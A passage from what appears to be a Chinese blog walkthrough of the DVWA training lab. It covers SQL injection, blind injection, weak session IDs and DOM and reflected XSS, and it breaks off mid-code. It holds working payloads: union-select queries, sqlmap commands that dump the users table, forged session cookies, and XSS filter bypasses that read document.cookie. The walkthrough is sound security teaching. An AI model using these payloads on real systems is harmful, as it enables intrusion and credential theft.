<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112181915754.png" alt="image-20240112181915754"></p>
<h2 id="high">High</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112184636745.png" alt="image-20240112184636745"></p>
<p>这一级别与第一关类似，只不过id的位置在session，并不在页面当中了</p>
<p>我们在input输入框中输入：<code>?id=-1' union select user, password from users--+</code>即可</p>
<h2 id="impossible">Impossible</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112185242167.png" alt="image-20240112185242167"></p>
<p>这里多了一个token的验证，同时判断用户输入的id是否为数字类型，如果不是直接无效，如果是的话，强制转换为整数类型，接着采用PDO预编译，导致我们无法进行SQL语句的闭合</p>
<p>prepare 预编译语句的优势在于归纳为：一次编译、多次运行，省去了解析优化等过程；此外预编译语句能防止 SQL 注入。</p>
<h1 id="0x08-sql-injection-blind">0x08 SQL Injection (Blind)</h1>
<h2 id="low">Low</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112185654418.png" alt="image-20240112185654418"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112185716349.png" alt="image-20240112185716349"></p>
<p>上述两处代码结合会发现，即使我们查询成功，也只会显示是否成功的消息展示，并不会将数据显示出来，这意味着我们只能进行盲注了</p>
<p>同时这与SQL注入类似，并不没有做出任何过滤</p>
<pre><code class="hljs scss">python3 sqlmap<span class="hljs-selector-class">.py</span> -u "http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/dvwa/vulnerabilities/sqli_blind/?id=<span class="hljs-number">1</span>*&amp;Submit=Submit#<span class="hljs-string">" --cookie "</span>security=low; PHPSESSID=cp58onvdgg0k61kihafkofof9j" <span class="hljs-attr">--current-db</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112192426242.png" alt="image-20240112192426242"></p>
<pre><code class="hljs scss">python3 sqlmap<span class="hljs-selector-class">.py</span> -u "http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/dvwa/vulnerabilities/sqli_blind/?id=<span class="hljs-number">1</span>*&amp;Submit=Submit#<span class="hljs-string">" --cookie "</span>security=low; PHPSESSID=cp58onvdgg0k61kihafkofof9j" -D dvwa <span class="hljs-attr">--tables</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112192455049.png" alt="image-20240112192455049"></p>
<pre><code class="hljs scss">python3 sqlmap<span class="hljs-selector-class">.py</span> -u "http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/dvwa/vulnerabilities/sqli_blind/?id=<span class="hljs-number">1</span>*&amp;Submit=Submit#<span class="hljs-string">" --cookie "</span>security=low; PHPSESSID=cp58onvdgg0k61kihafkofof9j" -D dvwa -T users <span class="hljs-attr">--dump</span> <span class="hljs-attr">--batch</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112192607692.png" alt="image-20240112192607692"></p>
<h2 id="medium">Medium</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112192717645.png" alt="image-20240112192717645"></p>
<p>依旧是盲注，虽然这里对id参数做了特殊字符转移，但类似0x07的 SQL注入，我们依旧是可以绕过的，比如16进制。</p>
<p>交给sqlmap完全可以</p>
<pre><code class="hljs scss">python3 sqlmap<span class="hljs-selector-class">.py</span> -u "http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/dvwa/vulnerabilities/sqli_blind/?id=<span class="hljs-number">1</span>*&amp;Submit=Submit#<span class="hljs-string">" --cookie "</span>security=medium; PHPSESSID=cp58onvdgg0k61kihafkofof9j" -D dvwa -T users <span class="hljs-attr">--dump</span> <span class="hljs-attr">--batch</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112192830472.png" alt="image-20240112192830472"></p>
<h2 id="high">High</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112192858971.png" alt="image-20240112192858971"></p>
<p>不同点在于id的位置换成了cookie，但仍然没有做出有效的限制，依旧可以sqlmap</p>
<pre><code class="hljs scss">python3 sqlmap<span class="hljs-selector-class">.py</span> -u "http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/dvwa/vulnerabilities/sqli_blind/<span class="hljs-string">" --cookie "</span>id=<span class="hljs-number">1</span>*; security=high; PHPSESSID=cp58onvdgg0k61kihafkofof9j" -D dvwa -T users <span class="hljs-attr">--dump</span> <span class="hljs-attr">--batch</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112200305536.png" alt="image-20240112200305536"></p>
<h2 id="impossible">Impossible</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112200425482.png" alt="image-20240112200425482"></p>
<p>这一等级同样采用了PDO的SQL预编译、防止CSRF，检查id是否为数字型。</p>
<h1 id="0x09-weak-session-ids">0x09 Weak Session IDs</h1>
<p>一种通过窃取用户SessionID，使用该SessionID登录进目标账户的攻击方法，此时攻击者实际上是使用了目标账户的有效Session。如果SessionID是保存在Cookie中的，则这种攻击可以称为Cookie劫持。</p>
<p>SessionID还可以保存在URL中，作为一个请求的一个参数，但是这种方式的安全性难以经受考验。</p>
<h2 id="low">Low</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$html</span> = <span class="hljs-string">""</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'REQUEST_METHOD'</span>] == <span class="hljs-string">"POST"</span>) {
    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'last_session_id'</span>])) {
        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'last_session_id'</span>] = <span class="hljs-number">0</span>;
    }
    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'last_session_id'</span>]++;
    <span class="hljs-variable">$cookie_value</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'last_session_id'</span>];
    <span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">"dvwaSession"</span>, <span class="hljs-variable">$cookie_value</span>);
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>这里的代码逻辑是，只要post方法请求一次，就会令session_id++，当然如果不存在的话，置零。</p>
<p>这很容易让攻击者伪造cookie，我们这里bp抓包一次发现如下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112201226875.png" alt="image-20240112201226875"></p>
<p>当我们将这个cookie复制下来，然后换一个浏览器访问该weak_session_id对应的url，会发现不需要登录直接就到达指定url页面</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112201210123.png" alt="image-20240112201210123"></p>
<h2 id="medium">Medium</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$html</span> = <span class="hljs-string">""</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'REQUEST_METHOD'</span>] == <span class="hljs-string">"POST"</span>) {
    <span class="hljs-variable">$cookie_value</span> = <span class="hljs-title function_ invoke__">time</span>();
    <span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">"dvwaSession"</span>, <span class="hljs-variable">$cookie_value</span>);
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>这里是采用时间戳作为session会话，但是这里时间戳也是有规律可循的，是可以伪造的。我们采用时间戳转换工具：</p>
<p><a target="_blank" rel="noopener" href="https://tool.lu/timestamp/">https://tool.lu/timestamp/</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112201820692.png" alt="image-20240112201820692"></p>
<p>这里我们可以选一个未来的时间，并转换为时间戳，接着我们可以诱骗用户在这一时间点击这一关的generate按钮</p>
<p>当其点击过之后，我们便可以成功进行伪造了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112201810896.png" alt="image-20240112201810896"></p>
<pre><code class="hljs scss">Cookie: dvwaSession=<span class="hljs-number">1705061825</span>; security_level=<span class="hljs-number">0</span>; ajs_anonymous_id=f11e1270-bf66-<span class="hljs-number">42</span>b5-b337-<span class="hljs-number">91</span>c6d4d5ff4f; ajs_user_id=<span class="hljs-number">048546</span>bfc1e19205a55a5993547bc9308acf5a9c; ocKey=<span class="hljs-number">512389862</span>aecb2132976ffe9960380f4; PHPSESSID=mc4bn9ou74faqboqg56aag47t0; security=medium</code></pre>
<p>将我们准备的时间戳伪造成cookie，接着换一个其他浏览器发送，即可绕过登录</p>
<h2 id="high">High</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$html</span> = <span class="hljs-string">""</span>;

<span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'REQUEST_METHOD'</span>] == <span class="hljs-string">"POST"</span>) {
    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'last_session_id_high'</span>])) {
        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'last_session_id_high'</span>] = <span class="hljs-number">0</span>;
    }
    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'last_session_id_high'</span>]++;
    <span class="hljs-variable">$cookie_value</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'last_session_id_high'</span>]);
    <span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">"dvwaSession"</span>, <span class="hljs-variable">$cookie_value</span>, <span class="hljs-title function_ invoke__">time</span>()+<span class="hljs-number">3600</span>, <span class="hljs-string">"/vulnerabilities/weak_id/"</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'HTTP_HOST'</span>], <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>这里与第一个low级别类似，不过这里的session经过了md5加密。我们bp抓包的时候可以很容易看出来md5的迹象的，经过一个解密即可知道是由数字0开始++之后得到的整数的md5加密值，依旧很容易构造</p>
<h2 id="impossible">Impossible</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$html</span> = <span class="hljs-string">""</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'REQUEST_METHOD'</span>] == <span class="hljs-string">"POST"</span>) {
    <span class="hljs-variable">$cookie_value</span> = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-title function_ invoke__">mt_rand</span>() . <span class="hljs-title function_ invoke__">time</span>() . <span class="hljs-string">"Impossible"</span>);
    <span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">"dvwaSession"</span>, <span class="hljs-variable">$cookie_value</span>, <span class="hljs-title function_ invoke__">time</span>()+<span class="hljs-number">3600</span>, <span class="hljs-string">"/vulnerabilities/weak_id/"</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'HTTP_HOST'</span>], <span class="hljs-literal">true</span>, <span class="hljs-literal">true</span>);
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>这里设置了随机数，然后拼接当前时间戳和impossible，最后经过sha1加密，如果我们不能得到随机数种子，以及后面的<code>Impossible</code>字符，是根本无法构造的。</p>
<p>这只是代码审计的前提下才知道其构造原理，如果单纯抓包等等，基本不可能判断出来其session产生原理。</p>
<h1 id="0x10-xssdom">0x10 XSS(DOM)</h1>
<h2 id="low">Low</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-comment"># No protections, anything goes</span>

<span class="hljs-meta">?&gt;</span></code></pre>
<p>无任何保护。。。。</p>
<p>我们看一下页面关于此处的html源码</p>
<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"vulnerable_code_area"</span>&gt;</span>

         <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Please choose a language:<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>

        <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"XSS"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"GET"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"default"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span>
<span class="language-xml"><span class="language-handlebars">                    if (document.location.href.indexOf("default=") &gt;= 0) {</span></span>
<span class="language-xml"><span class="language-handlebars">                        var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);</span></span>
<span class="language-xml"><span class="language-handlebars">                        document.write("<span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">'" + lang + "'</span>&gt;</span>" + $decodeURI(lang) + "<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span>");</span></span>
<span class="language-xml"><span class="language-handlebars">                        document.write("<span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">''</span> <span class="hljs-attr">disabled</span>=<span class="hljs-string">'disabled'</span>&gt;</span>----<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span>");</span></span>
<span class="language-xml"><span class="language-handlebars">                    }</span></span>
<span class="language-xml"><span class="language-handlebars"></span></span>
<span class="language-xml"><span class="language-handlebars">                    document.write("<span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">'English'</span>&gt;</span>English<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span>");</span></span>
<span class="language-xml"><span class="language-handlebars">                    document.write("<span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">'French'</span>&gt;</span>French<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span>");</span></span>
<span class="language-xml"><span class="language-handlebars">                    document.write("<span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">'Spanish'</span>&gt;</span>Spanish<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span>");</span></span>
<span class="language-xml"><span class="language-handlebars">                    document.write("<span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">'German'</span>&gt;</span>German<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span>");</span></span>
<span class="language-xml"><span class="language-handlebars">                </span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"Select"</span> /&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></code></pre>
<p>很明显这里对用户的输入复制给了lang变量，接着在没有任何过滤的情况下直接进行url解码拼接到document.write函数下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112203626229.png" alt="image-20240112203626229"></p>
<h2 id="medium">Medium</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">// Is there any input?</span>
<span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">"default"</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; !<span class="hljs-title function_ invoke__">is_null</span> (<span class="hljs-variable">$_GET</span>[ <span class="hljs-string">'default'</span> ]) ) {
    <span class="hljs-variable">$default</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'default'</span>];
    
    <span class="hljs-comment"># Do not allow script tags</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stripos</span> (<span class="hljs-variable">$default</span>, <span class="hljs-string">"&lt;script"</span>) !== <span class="hljs-literal">false</span>) {
        <span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">"location: ?default=English"</span>);
        <span class="hljs-keyword">exit</span>;
    }
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>这里过滤了<code>&lt;script</code>标签，但我们还可以选择更多的标签来绕过</p>
<pre><code class="hljs scss">?default=&lt;<span class="hljs-selector-tag">img</span> <span class="hljs-attribute">src</span>=<span class="hljs-number">1</span> onerror=<span class="hljs-built_in">alert</span>('hacker')&gt;</code></pre>
<p>但毕竟我们换了标签，必须要闭合前面的标签，否则这里的img标签便不起作用了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112204025723.png" alt="image-20240112204025723"></p>
<p>闭合option与select标签即可</p>
<pre><code class="hljs scss">?default=&lt;/option&gt;&lt;/select&gt;&lt;<span class="hljs-selector-tag">img</span> <span class="hljs-attribute">src</span>=<span class="hljs-number">1</span> onerror=<span class="hljs-built_in">alert</span>('hacker')&gt;</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112204419920.png" alt="image-20240112204419920"></p>
<h2 id="high">High</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">// Is there any input?</span>
<span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">"default"</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; !<span class="hljs-title function_ invoke__">is_null</span> (<span class="hljs-variable">$_GET</span>[ <span class="hljs-string">'default'</span> ]) ) {
    <span class="hljs-comment"># White list the allowable languages</span>
    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'default'</span>]) {
        <span class="hljs-keyword">case</span> <span class="hljs-string">"French"</span>:
        <span class="hljs-keyword">case</span> <span class="hljs-string">"English"</span>:
        <span class="hljs-keyword">case</span> <span class="hljs-string">"German"</span>:
        <span class="hljs-keyword">case</span> <span class="hljs-string">"Spanish"</span>:
            <span class="hljs-comment"># ok</span>
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">default</span>:
            <span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">"location: ?default=English"</span>);
            <span class="hljs-keyword">exit</span>;
    }
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>这里说如果default的值不是上面四个指定的值中的一个，则直接无效，这里学了师傅们的两个思路</p>
<p>方法一：可以使用 <code>&amp;</code> 连接另一个自定义变量来 Bypass</p>
<pre><code class="hljs scss">?default=English&amp;<span class="hljs-selector-tag">a</span>=&lt;/option&gt;&lt;/select&gt;&lt;<span class="hljs-selector-tag">img</span> <span class="hljs-attribute">src</span>=x onerror=<span class="hljs-built_in">alert</span>('XSS')&gt;

?default=English&amp;<span class="hljs-selector-tag">a</span>=&lt;<span class="hljs-selector-tag">input</span> onclick=<span class="hljs-built_in">alert</span>('XSS') /&gt;</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112204856429.png" alt="image-20240112204856429"></p>
<p>方法二：使用<code>#</code>来 Bypass</p>
<p>注：在url中#后边的内容不会发送到服务端，从而可以实现绕过。</p>
<pre><code class="hljs scss">?default=English#&lt;/option&gt;&lt;/select&gt;&lt;<span class="hljs-selector-tag">BODY</span> ONLOAD=<span class="hljs-built_in">alert</span>(document.cookie)&gt;
?default=English#&lt;<span class="hljs-selector-tag">input</span> onclick=<span class="hljs-built_in">alert</span>('document.cookie') /&gt;</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112205022569.png" alt="image-20240112205022569"></p>
<h2 id="impossible">Impossible</h2>
<pre><code class="hljs php">
<span class="hljs-meta">&lt;?php</span>

<span class="hljs-comment"># Don't need to do anything, protection handled on the client side</span>

<span class="hljs-meta">?&gt;</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112205131439.png" alt="image-20240112205131439"></p>
<p>可以看见客户端这里对我们的输入的数据不进行url解码了，这样会导致标签失效，从而无法 XSS</p>
<h1 id="0x11-xssreflected">0x11 XSS(Reflected)</h1>
<h2 id="low">Low</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">"X-XSS-Protection: 0"</span>);
<span class="hljs-comment">// Is there any input?</span>
<span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">"name"</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">'name'</span> ] != <span class="hljs-literal">NULL</span> ) {
    <span class="hljs-comment">// Feedback for end user</span>
    <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;pre&gt;Hello '</span> . <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">'name'</span> ] . <span class="hljs-string">'&lt;/pre&gt;'</span>;
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>这里只是判断是否存在name变量，如果存在直接插入</p><pre>标签中，不存在任何过滤</pre><p></p>
<pre><code class="hljs scss">&lt;script&gt;<span class="hljs-built_in">alert</span>('hacker')&lt;/script&gt;</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112210440503.png" alt="image-20240112210440503"></p>
<h2 id="medium">Medium</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">"X-XSS-Protection: 0"</span>);
<span class="hljs-comment">// Is there any input?</span>
<span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">"name"</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">'name'</span> ] != <span class="hljs-literal">NULL</span> ) {
    <span class="hljs-comment">// Get input</span>
    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-string">'&lt;script&gt;'</span>, <span class="hljs-string">''</span>, <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">'name'</span> ] );

    <span class="hljs-comment">// Feedback for end user</span>
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;Hello <span class="hljs-subst">{$name}</span>&lt;/pre&gt;"</span>;
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>将<script>过滤为空，这意味着可以大写或者双写绕过</p>
<pre><code class="hljs scss">&lt;s&lt;script&gt;cript&gt;<span class="hljs-built_in">alert</span>(&#x27;hacker&#x27;)&lt;/script&gt;
&lt;Script&gt;cript&gt;<span class="hljs-built_in">alert</span>(&#x27;hacker&#x27;)&lt;/script&gt;</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112210655274.png" alt="image-20240112210655274"></p>
<h2 id="High-11">High</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);
<span class="hljs-comment">// Is there any input?</span>
<span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;
    <span class="hljs-comment">// Get input</span>
    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">preg_replace</span>( <span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );

    <span class="hljs-comment">// Feedback for end user</span>
